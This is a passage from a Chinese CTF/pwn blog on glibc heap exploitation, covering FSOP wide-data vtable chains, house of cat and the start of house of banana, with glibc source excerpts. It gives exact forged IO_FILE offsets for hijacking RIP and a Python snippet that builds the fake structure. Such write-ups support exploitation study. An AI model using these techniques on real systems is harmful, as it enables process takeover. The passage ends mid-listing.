*_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>假设劫持了vtable 到 <code>IO_wdata_jumps</code> 之后，调用overflow</p>
<ul>
<li>因为是宏展开，进入 <code>_IO_wfile_jumps</code> 的 overflow 函数。</li>
<li>而这个函数执行流如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow(FILE *f, <span class="type">wint_t</span> wch) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> ||</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>) &#123;</span><br><span class="line">      _IO_wdoallocbuf(f);</span><br><span class="line">      _IO_free_wbackup_area(f);</span><br><span class="line">      _IO_wsetg(f, f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">         (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">         the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">         block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">         that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">         external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end) &#123;</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF) <span class="keyword">return</span> _IO_do_flush(f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) ||</span><br><span class="line">      ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span>(_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>

<p>主要看其中的函数调用，这里主要看作者的几条连</p>
<p>链1：<code>_IO_wfile_overflow</code> 控制函数执行流，但是需要绕过某些检查。伪造fp</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code>，比如说C为system函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链2：<code>_IO_wfile_underflow_mmap</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链3：<code>_IO_wdefault_xsgetn</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>



<p>总结一下：使用 <code>largebin attack</code> 劫持<code>_IO_list_all</code> 变量</p>
<ul>
<li>将其替换为一个伪造的 <code>IO_FILE</code> 结构体（某个我们可控内容的堆）</li>
<li>IO_FILE的 <code>_wide_data</code> 伪造为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>IO_FILE的 <code>vtable</code> 伪造为 <code>_IO_wfile_jumps</code>，这是一个 const 变量, gdb使用<code>p &amp;_IO_wfile_jumps</code>查看</li>
<li>在需要写shellcode时，将C设置为一个写满ROP的堆地址就行。常使用setcontext</li>
</ul>
<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>函数调用链</p>
<ul>
<li><code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数中来攻击</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert</span><br><span class="line">	​__fxprintf</span><br><span class="line">		​locked_vfxprintf</span><br><span class="line">			__vfprintf_internal #在这里是跳转到IO_validate_vtable通过vtable+<span class="number">0x38</span>调用的下面函数</span><br><span class="line">				​_IO_wfile_seekoff</span><br><span class="line">					_IO_switch_to_wget_mode</span><br><span class="line">						​call qword ptr [rax + <span class="number">0x18</span>] <span class="meta">#rax是伪造的io_file的地址</span></span><br></pre></td></tr></table></figure>


<p>并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<code>_IO_wfile_seekoff</code>即可（通常是结合<code>__malloc_assert</code>，改vtable为<code>_IO_wfile_jumps+0x10</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))   <span class="comment">// xxxx</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>


<p>在这里调用 <code>_wide_data</code> 里的 <code>vtable的_overflow</code>，JUMP宏 且没有检查</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>

<p>在<code>_IO_switch_to_wget_mode</code> 调试时发现如下的汇编代码</p>
<ul>
<li>rdi 是 fp 指针，是我们可以伪造的一个 IO_FILE。</li>
<li>通过 rdi控制 rax，在通过rax控制rdx，也可以过jbe指令。从而最后call 我们指定的shellcode</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line"> <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line"> <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line"> <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>

<p>所以最后的伪造如下</p>
<ul>
<li>rax1 为上面的rax</li>
<li>rax2 为下面的rax寄存器</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span>                        <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)                              <span class="comment"># _flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)                        <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)               <span class="comment"># _IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)                       <span class="comment"># _IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                               <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)                 <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)               <span class="comment"># _wide_data, rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                               <span class="comment"># mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)          <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)               <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><p>不是一种攻击IO_FILE的利用手段。程序通过exit退出时，会调用一个名叫 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<ul>
<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
<li>可以泄露 <code>libc</code> 地址和堆地址</li>
</ul>
<p>gdb 常用的指令</p>
<ul>
<li>这是ld.so 文件中的一个地址，因此不能使用libc.sym获得地址</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">p &amp;_rtld_global</span><br></pre></td></tr></table></figure>


<p><code>rtld_global</code> 结构体里面装有 <code>_dl_ns</code> 结构体，通过正常 main 函数返回或者调用 exit 退出，触发函数调用链：<code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code>。</p>
<ul>
<li>glibc 2.37 后的源码，对比之前的与那吗，发现主要的变化为 <code>_dl_call_fini(l);</code>，跟进函数发现除了输出debugging信息函数变了，其余都没变</li>
<li>link map 使用双向链表连接起来</li>
<li>nmaps 是 <code>maps[]</code> 中元素个数，也就是 <code>GL(dl_ns)[ns]._ns_loaded</code></li>
<li>建议自己随便写个程序，将其中变量打印出来看看。这里加载下面的注释里</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1</span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">       auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    )</span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span 